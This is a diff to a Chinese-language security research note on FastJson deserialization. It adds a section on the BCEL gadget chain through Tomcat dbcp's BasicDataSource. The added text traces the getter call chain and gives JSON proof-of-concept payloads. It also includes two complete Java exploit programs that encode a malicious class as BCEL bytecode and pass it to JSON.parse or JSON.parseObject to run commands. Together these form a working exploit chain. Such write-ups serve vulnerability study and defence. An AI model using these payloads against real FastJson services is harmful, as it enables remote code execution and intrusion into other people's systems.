@@ -350,9 +350,167 @@ public class FastJson124 {
 
 至此，FastJson 反序列化流程算是告一段落。
 
-## FastJson反序列化之BECL
+到这里不难发现该条攻击链限制非常大，要求存在漏洞的目标使用`JSON.parseObject()`方法时，需要存在第三个参数`Feature.SupportNonPublicField`才能利用，在实战中过于理想化。
 
-待补充
+因此接下来，我们将探索 FastJson 的其他利用方法。
+
+## FastJson反序列化之BCEL(1.1.15 - 1.2.4)
+
+该攻击方法除了需要 FastJson 的依赖，还需要 dbcp 的依赖：
+
+```xml
+<dependency>
+    <groupId>org.apache.tomcat</groupId>
+    <artifactId>dbcp</artifactId>
+    <version>6.0.53</version>
+</dependency>
+```
+
+因为我们需要的类为`org.apache.tomcat.dbcp.dbcp.BasicDataSource`（不同版本依赖包路径不同）
+![image-20221229122746688](images/image-20221229122746688.png)
+
+可以看到当`driverClassLoader`不为空时进入 else 条件语句中，可以通过反射调用自定义类加载器加载字节码，同时`driverClassName`和`driverClassLoader`都有对应的 setter 方法
+![image-20221229123019524](images/image-20221229123019524.png)
+
+![image-20221229123234700](images/image-20221229123234700.png)
+
+那接下来就是找一下怎么调用`createConnectionFactory()`方法
+![image-20221229123356517](images/image-20221229123356517.png)
+
+可以看到在`createDataSource()`方法中调用了`createConnectionFactory()`，接下来找哪里调用了`createDataSource()`方法
+![image-20221229123506403](images/image-20221229123506403.png)
+
+在`getConnection()`方法中调用了`createDataSource()`方法，而`getConnection()`是一个 getter 方法，是我们要寻找的最终目标，接下来就是调用`com.sun.org.apache.bcel.internal.util.ClassLoader`类加载器加载字节码进行利用，即构造如下的 POC：
+```json
+{
+    "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource", 
+    "driverClassLoader": {
+        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+    }, 
+    "driverClassName": "$$BCEL$$......"
+}
+```
+
+但运行后并未成功执行恶意类中编写的命令，问题出在了哪里呢？经过一番调试，发现并没有调用到`getConnection()`方法，原因是该方法返回的类型为`Connection`，不满足我们前面说过的继承于`Collection`、`Map`、`AtomicBoolean`、`AtomicInteger`和`AtomicLong`之中的任意一个类的条件。
+
+有两种办法解决该问题。
+
+第一种就是再使用一层`{}`将其包裹，变成如下的格式：
+
+```json
+{
+       {
+         "aaa":{
+                  "@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+                   "driverClassLoader":{
+                     "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                    },
+                   "driverClassName":"$$BCEL$$......"
+       }
+     }:"bbb"
+}
+```
+
+此时会把`{}`当做一个`JSONObject`对象进行逐层解析
+![image-20221229172644495](images/image-20221229172644495.png)
+
+如上图所示，此时的 key 为：`{"aaa":{......}}`，value 为`bbb`，而`JSONObject`正好实现了`Map`接口和继承于`JSON`类。在调用`key.toString()`方法时，会调用到`JSON.toString()`方法
+![image-20221229174756265](images/image-20221229174756265.png)
+
+随后步入到`write()`方法，最后调用`JavaBeanSerializer#write()`方法
+![image-20221229184650578](images/image-20221229184650578.png)
+
+从图中可以看到，获得了该类所有 getter 方法，最终调用到`getConnection()`方法。
+
+贴一下调用链图：
+![image-20221229185511514](images/image-20221229185511514.png)
+
+编写 exp：
+```java
+package com.fastjson.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.fastjson.becl.EvilDemo;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+/**
+ * Created by dotast on 2022/12/29 12:02
+ */
+public class FastJson124Bcel {
+    public static void main(String[] args) throws Exception {
+        // 加载恶意类字节码
+        JavaClass javaClass = Repository.lookupClass(EvilDemo.class);
+        String byteCode = "$$BCEL$$" + Utility.encode(javaClass.getBytes(), true);
+        String targetClass = "org.apache.tomcat.dbcp.dbcp.BasicDataSource";
+        String bcelClass = "com.sun.org.apache.bcel.internal.util.ClassLoader";
+        String exp = "{\n" +
+                "       {\n" +
+                "         \"aaa\":{\n"+
+                "                  \"@type\":\"" + targetClass + "\",\n" +
+                "                   \"driverClassLoader\":{\n" +
+                "                     \"@type\": \"" + bcelClass + "\"\n" +
+                "                    },\n" +
+                "                   \"driverClassName\":\"" + byteCode + "\"\n" +
+                "       }\n" +
+                "     }:"+"\"bbb\"\n" +
+                "}";
+        System.out.println(exp);
+        JSON.parse(exp);
+    }
+}
+
+```
+
+运行后成功执行恶意类的命令
+![image-20221229185834928](images/image-20221229185834928.png)
+
+另一种解决方法就是使用`JSON.parseObject()`方法，还是保持原来的格式：
+```json
+{
+    "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource", 
+    "driverClassLoader": {
+        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+    }, 
+    "driverClassName": "$$BCEL$$......"
+}
+```
+
+编写 exp：
+```java
+package com.fastjson.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.fastjson.becl.EvilDemo;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+/**
+ * Created by dotast on 2022/12/29 12:02
+ */
+public class FastJson124Bcel {
+    public static void main(String[] args) throws Exception {
+        // 加载恶意类字节码
+        JavaClass javaClass = Repository.lookupClass(EvilDemo.class);
+        String byteCode = "$$BCEL$$" + Utility.encode(javaClass.getBytes(), true);
+        String targetClass = "org.apache.tomcat.dbcp.dbcp.BasicDataSource";
+        String bcelClass = "com.sun.org.apache.bcel.internal.util.ClassLoader";
+        String exp = "{\n"+
+                "      \"@type\":\"" + targetClass + "\",\n" +
+                "      \"driverClassLoader\":{\n" +
+                "      \"@type\": \"" + bcelClass + "\"\n" +
+                "       },\n" +
+                "      \"driverClassName\":\"" + byteCode + "\"\n" +
+                "       }\n";
+        System.out.println(exp);
+        JSON.parseObject(exp);
+    }
+}
+```
+
+与`JSON.parse()`方法不同的是，`JSON.parseObject()`方法多调用了`JSON.toJSON()`方法将 Java 对象转换为 JSONObject 对象。
 
 ## FastJson反序列化之JNDI
 
@@ -364,7 +522,7 @@ public class FastJson124 {
 
 ![1616458393831](images/1616458393831.png)
 
-- 反序列方法中，`JSON.parse()`和`JSON.parseObject()`的实现效果一样，前者会在解析 json 字符串时获取`@type`参数指定的类，后者则是可以通过参数中的类进行使用。
+- 反序列方法中，`JSON.parse()`和`JSON.parseObject()`的实现效果一样，前者会在解析 json 字符串时获取`@type`参数指定的类，后者则是可以通过参数中的类进行使用。除此之外，`JSON.parseObject()`方法多调用了`JSON.toJSON()`方法将 Java 对象转换为 JSONObject 对象。
 
 - FastJson 在创建类的示例时，会通过反射调用符合判断条件的该类的 getter 或者 setter 方法，其中 getter 需要满足的条件为：
 
